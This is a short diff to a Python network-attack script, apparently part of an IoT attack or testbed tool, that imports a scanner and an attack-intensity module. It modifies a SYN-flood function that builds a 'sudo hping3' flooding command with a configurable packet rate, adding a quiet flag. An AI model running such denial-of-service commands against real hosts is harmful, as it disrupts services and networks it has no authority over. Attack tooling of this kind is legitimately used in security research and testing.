@@ -4,6 +4,7 @@ import external_script.PyRai.scanner as sc
 import signal
 from time import sleep
 import os
+from attack_intensity import *
 
 
 # ARP Scan을 사용 - 가장 빠르게 스캔이 가능하며, 포트 번호가 필요치 않음
@@ -103,7 +104,7 @@ def syn_flood(dstIP, dstPort, pps, count):
     print(f'[SYN Flooding] @ {pps}')
     log('Start', attack_type='SYN Flooding', param_info={'port': dstPort, 'pps': pps, 'count': count})
     interval_us = round(10**6/pps)    # microseconds
-    attack_command = f'sudo hping3 {dstIP} -i u{interval_us} -S -p {dstPort} -c {count}'  # + ' --rand-source'
+    attack_command = f'sudo hping3 {dstIP} -i u{interval_us} -S -p {dstPort} -c {count} -q'  # + ' --rand-source'
     attack_command_list_form = attack_command.split(' ')
 
     log('Mid', attack_command)
